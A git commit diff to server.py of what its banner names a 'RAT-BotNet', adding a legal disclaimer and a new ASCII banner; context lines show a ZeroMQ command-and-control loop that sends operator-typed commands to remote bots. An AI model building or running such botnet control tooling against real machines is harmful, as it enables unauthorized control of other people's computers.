b0f27c2ced58e0d32b4c306967b8dd75f18199da
Danilo Lazic <61419348+dnllzc@users.noreply.github.com>
2024-11-18 13:43:07 +0100

    Update server.py
    Added disclaimer print.

--- server.py
+++ server.py
@@ -2,13 +2,21 @@ import zmq
 import os
 
 ASCII_ART = r"""
-     _       _ _               ______       _   _   _      _   
-    | |     | | |              | ___ \     | | | \ | |    | |  
-  __| |_ __ | | |_______ ______| |_/ / ___ | |_|  \| | ___| |_ 
- / _` | '_ \| | |_  / __|______| ___ \/ _ \| __| . ` |/ _ \ __|
-| (_| | | | | | |/ / (__       | |_/ / (_) | |_| |\  |  __/ |_ 
- \__,_|_| |_|_|_/___\___|      \____/ \___/ \__\_| \_/\___|\__|
+     _       _ _               ______  ___ _____     ______       _   _   _      _   
+    | |     | | |              | ___ \/ _ \_   _|    | ___ \     | | | \ | |    | |  
+  __| |_ __ | | |_______ ______| |_/ / /_\ \| |______| |_/ / ___ | |_|  \| | ___| |_ 
+ / _` | '_ \| | |_  / __|______|    /|  _  || |______| ___ \/ _ \| __| . ` |/ _ \ __|
+| (_| | | | | | |/ / (__       | |\ \| | | || |      | |_/ / (_) | |_| |\  |  __/ |_ 
+ \__,_|_| |_|_|_/___\___|      \_| \_\_| |_/\_/      \____/ \___/ \__\_| \_/\___|\__|
+                                                                                     
+"""
 
+DISCLAIMER = r"""
+ ⚠ DISCLAIMER:
+ This software is intended for educational purposes only. 
+ The misuse of this tool in any unauthorized or malicious activities is 
+ strictly prohibited and could lead to severe legal consequences.
+ The authors assume no responsibility for any misuse of this software.
 """
 
 def clear_screen():
@@ -22,6 +30,7 @@ def main():
     command_socket.bind("tcp://*:9292")
     
     clear_screen()
+    print(DISCLAIMER)
     print("Server is running. Type commands to send (type 'exit' to stop):")
     while True:
         command = input("Command >> $").strip()
